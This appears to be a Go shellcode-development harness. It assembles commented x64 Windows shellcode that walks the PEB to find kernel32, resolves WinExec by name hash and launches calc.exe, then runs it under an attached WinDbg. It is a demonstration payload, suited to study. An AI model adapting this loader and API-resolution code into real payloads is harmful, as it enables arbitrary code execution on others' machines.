package main

import (
	"fmt"
	"log"
	"strings"
)

func main() {

	shellcode := []string{

		"find_kernel32:",
		" xor rdx, rdx;",
		" mov rax, gs:[rdx+0x60];", // RAX stores  the value of ProcessEnvironmentBlock member in TEB, which is the PEB address
		" mov rsi,[rax+0x18];",     // Get the value of the LDR member in PEB, which is the address of the _PEB_LDR_DATA structure
		" mov rsi,[rsi + 0x20];",   // RSI is the address of the InMemoryOrderModuleList member in the _PEB_LDR_DATA structure
		" mov r9, [rsi];",          // Current module is python.exe
		" mov r9, [r9];",           // Current module is ntdll.dll
		" mov r9, [r9+0x20];",      // Current module is kernel32.dll
		" jmp call_winexec;",

		"parse_module:",                    // Parsing DLL file in memory
		" mov ecx, dword ptr [r9 + 0x3c];", // R9 stores  the base address of the module, get the NT header offset
		" xor r15, r15;",
		" mov r15b, 0x88;", // Offset to Export Directory
		" add r15, r9;",
		" add r15, rcx;",
		" mov r15d, dword ptr [r15];",        // Get the RVA of the export directory
		" add r15, r9;",                      // R14 stores  the VMA of the export directory
		" mov ecx, dword ptr [r15 + 0x18];",  // ECX stores  the number of function names as an index value
		" mov r14d, dword ptr [r15 + 0x20];", // Get the RVA of ENPT
		" add r14, r9;",                      // R14 stores  the VMA of ENPT

		"search_function:",  // Search for a given function
		" jrcxz not_found;", // If RCX is 0, the given function is not found
		" dec ecx;",         // Decrease index by 1
		" xor rsi, rsi;",
		" mov esi, [r14 + rcx*4];", // RVA of function name string
		" add rsi, r9;",            // RSI points to function name string

		"function_hashing:", // Hash function name function
		" xor rax, rax;",
		" xor rdx, rdx;",
		" cld;", // Clear DF flag

		"iteration:",        // Iterate over each byte
		" lodsb;",           // Copy the next byte of RSI to Al
		" test al, al;",     // If reaching the end of the string
		" jz compare_hash;", // Compare hash
		" ror edx, 0x0d;",   // Part of hash algorithm
		" add edx, eax;",    // Part of hash algorithm
		" jmp iteration;",   // Next byte

		"compare_hash:", // Compare hash
		" cmp edx, r8d;",
		" jnz search_function;",               // If not equal, search the previous function (index decreases)
		" mov r10d, [r15 + 0x24];",            // Ordinal table RVA
		" add r10, r9;",                       // Ordinal table VMA
		" movzx ecx, word ptr [r10 + 2*rcx];", // Ordinal value -1
		" mov r11d, [r15 + 0x1c];",            // RVA of EAT
		" add r11, r9;",                       // VMA of EAT
		" mov eax, [r11 + 4*rcx];",            // RAX stores  RVA of the function
		" add rax, r9;",                       // RAX stores  VMA of the function
		" ret;",
		"not_found:",
		" ret;",

		"call_winexec:",
		"    mov r8d, 0xe8afe98;", // WinExec Hash
		"    call parse_module;",  // Search and obtain address of WinExec
		"    xor rcx, rcx;",
		"    push rcx;",                    // \0
		"    mov rcx, 0x6578652e636c6163;", // exe.clac
		"    push rcx;",
		"    lea rcx, [rsp];", // Address of the string as the 1st argument lpCmdLine
		"    xor rdx,rdx;",
		"    inc rdx;", // uCmdShow=1 as the 2nd argument
		"    sub rsp, 0x28;",
		"    call rax;", // WinExec
	}

	asm := strings.Join(shellcode, "") // convert slice to a single string
	sc, err := GenerateShellcode(asm)  // generates shellcode from asm string. Values hardcoded for x84_64 arch.
	if err != nil {
		log.Fatalln(err)
	}
	err = AttachWindbg() // Automatically attach debugger
	if err != nil {
		log.Fatalln(err)
	}

	fmt.Print("Press Enter to continue...") //Waiting for the debugger to attach
	fmt.Scanln()
	fmt.Println("Continuing...")

	err = ShellcodeRunner(sc) //Run the generated shellcode
	if err != nil {
		log.Fatalln(err)
	}

	fmt.Println("done")
}
